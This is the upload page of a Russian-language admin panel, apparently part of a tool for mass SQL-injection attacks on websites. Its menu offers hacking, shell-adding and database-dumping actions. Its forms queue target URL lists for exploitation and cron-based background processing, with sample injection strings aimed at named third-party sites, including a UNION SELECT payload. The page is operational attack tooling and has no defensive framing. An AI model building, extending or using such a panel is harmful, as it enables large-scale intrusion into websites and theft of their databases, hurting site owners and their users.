	<!-- START CONTENT -->
	<div id="content">
		<ul class="page-nav fl">
			<li ><?=$html->link('Состояние',array('action'=>'mailinfo')); ?></li>
			<li class="active"><?=$html->link('Добавить ссылки',array('action'=>'add')); ?></li>
			<li><?=$html->link('Добавить домены',array('action'=>'add_domens')); ?></li>
			<li><?=$html->link('Добавить шеллы',array('action'=>'add_shells')); ?></li>
			<li ><?=$html->link('Одиночный взлом',array('action'=>'add_one')); ?></li>
			<li><?=$html->link('Одиночный дампинг',array('action'=>'dumping_all')); ?></li>
			
		</ul>
		<div class="clear"></div>
	
		<table class="table">
			<thead>
				<th>Добавление ссылок</th>
			</thead>
			<tbody>
				<tr>
					<td>
					
					
					
						<label for="hash">Укажите путь к файлу ссылок(добавить сразу) ЕСЛИ ХОТИТЕ ЗАЛИВАТЬ 1 ЛИНК  = 1 ДОМЕН. Сразу в основную базу:</label><br>
						Формат для POST СКУЛЬ	post::http://ceserfarma.it?login_nick=1*&login_password=5543!%arachni_secret&submitLogin=Effettua il Log-In
						
						
						<?=$form->create('Post',array('type'=>'file',))?>
						<?=$form->input('file_one',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
						
						<?=$form->submit('Добавить', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
						<?=$form->end()?>
						
						<br>
							
					
						<br/>
						<br/>
						
						<br>
						<!--
						<label for="hash">Укажите путь к файлу ссылок в формате SQLI_DUMPERA ( ЕЩЕ ТЕСТИРУЕТСЯ ! НЕ ТРОГАЙТЕ)</label>
						http://www.13lune.it/arguments.php?idArgs=999999.9 union all select 1,2,3,[t],5,6,7,8,9,10,11,12,13,14,15,16,17,18--
						<?=$form->create('Post',array('type'=>'file'))?>
						<?=$form->input('file_sqli_dumper',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
						<?=$form->submit('Добавить', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
						<?=$form->end()?>
						
						<br>
						<br>
						<br>
						<br>
					
						
						
					
						
						
						
						<label for="hash">Укажите путь к файлу ссылок чекать на уязвимости чисто через SQLMAP</label>
						<?=$form->create('Post',array('type'=>'file'))?>
						<?=$form->input('file_sqlmap',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
						<?=$form->submit('Добавить', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
						<?=$form->end()?>
					-->	
						<br>
						<br>
						<br>
						<br>	
						
						
						
						
					
						
					
					
					
					
						<label for="hash">Укажите путь к файлу ссылок(добавить сразу) СЮДА МОЖНО ДОБАВЛЯТЬ МНОГО ССЫЛОК С ДОМЕНА КАК GET ТАК И POST в config.php $this->link_count = 3; поправьте</label>
						<?=$form->create('Post',array('type'=>'file'))?>
						<?=$form->input('add',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
						<?=$form->submit('Добавить', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
						<?=$form->end()?>
						<br>
						
						
						<br>
						<br>
						<br>
						
						
						
						
						<label for="hash">Укажите путь к файлу ссылок(фоновое добавление):</label>
						<?=$form->create('Post',array('type'=>'file'))?>
						<?=$form->input('file_cron',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
						
						<br>
						
						<?=$form->input('link2',array('type'=>'text', 'class'=>'input','div'=>false,'label'=>'url к файлу с ссылками для крона '))?>
							<br>
						
						
						<?=$form->submit('Добавить в крон', array('name'=>'cron','class'=>'btn btn_green','div'=>false))?>
						<?=$form->end()?>
						<br/>
						
						
						<span class="comment red">Допустимый формат файлов .txt в кодировке UTF-8</span>
					</td>
				</tr>
			</tbody>
		</table>

	</div>
	<!-- STOP CONTENT -->
		
		
		
		

